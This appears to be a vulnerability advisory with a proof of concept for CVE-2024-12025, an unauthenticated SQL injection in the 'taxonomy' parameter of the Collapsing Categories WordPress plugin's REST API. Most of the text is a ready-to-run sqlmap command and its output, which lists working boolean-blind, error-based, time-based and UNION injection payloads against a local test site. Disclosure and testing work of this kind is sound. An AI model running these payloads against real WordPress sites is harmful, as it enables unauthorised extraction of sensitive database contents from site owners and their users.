# CVE-2024-12025
Collapsing Categories <= 3.0.8 - Unauthenticated SQL Injection

# Description

The Collapsing Categories plugin for WordPress is vulnerable to SQL Injection via the 'taxonomy' parameter of the /wp-json/collapsing-categories/v1/get REST API in all versions up to, and including, 3.0.8 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.  This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

## Details

- **Type**: plugin
- **Slug**: collapsing-categories
- **Affected Version**: 3.0.8
- **CVSS Score**: 7.5
- **CVSS Rating**: High
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **CVE**: CVE-2024-12025
- **Status**: Active

POC
---

```
python3 sqlmap.py -u 'https://wp-dev.ddev.site:443/wp-json/collapsing-categories/v1/get?taxonomy=category' --level=3 --risk=3 --dbms='MySQL'
```


```
GET parameter 'taxonomy' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: taxonomy (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: taxonomy=category') AND 7946=7946 AND ('HpEV'='HpEV

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: taxonomy=category') AND (SELECT 7250 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(7250=7250,1))),0x7162706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('hZXr'='hZXr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: taxonomy=category') AND (SELECT 2450 FROM (SELECT(SLEEP(5)))BSAn) AND ('lfDY'='lfDY

    Type: UNION query
    Title: Generic UNION query (NULL) - 12 columns
    Payload: taxonomy=category') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7176707171,0x6e42754559704d7a675861454b4c58444e466968774b4d664161795758694376634a654e68594a58,0x7162706a71)-- -
---
[14:14:52] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```
